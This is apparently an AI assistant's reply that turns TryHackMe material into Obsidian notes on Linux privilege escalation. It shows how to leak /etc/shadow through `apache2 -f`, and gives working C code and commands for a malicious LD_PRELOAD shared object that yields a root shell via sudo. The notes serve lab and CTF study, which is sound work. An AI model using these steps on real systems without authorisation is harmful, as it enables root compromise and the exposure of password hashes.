Perfect — here’s a **TryHackMe-tailored Obsidian summary** you can paste directly into your notes:

---

## 🧩 THM Notes: Privilege Escalation via Application Functions & `LD_PRELOAD`

### 🔧 Leverage Application Functions

* Some binaries (e.g., `apache2`) don’t have known exploits but expose **useful behavior**.
* Example:

  * `apache2 -f <file>` lets you load a custom config.
  * If used with `/etc/shadow`:

    ```bash
    apache2 -f /etc/shadow
    ```

    It throws an error **including the first line of the file**, leaking sensitive info.

---

### 🧬 Leverage `LD_PRELOAD` for Privilege Escalation

* `LD_PRELOAD` forces a binary to load a custom `.so` (shared object) before running.
* Can lead to **root shell** if:

  * You can `sudo` a binary
  * `/etc/sudoers` allows `LD_PRELOAD` via `env_keep+=LD_PRELOAD`
  * The binary doesn’t drop privileges

#### 🪜 Steps

1. **Write malicious shared object:**

```c
// shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

2. **Compile it:**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. **Run with `sudo` + `LD_PRELOAD`:**

```bash
sudo LD_PRELOAD=/path/to/shell.so find
```

> If the binary is `sudo`-allowed and environment-preserving, it will spawn a **root shell**.

---

### 💡 Useful for:

* THM rooms
* CTFs
* Real-world misconfigurations

---

Let me know if you want Obsidian tags or a vault-friendly template!
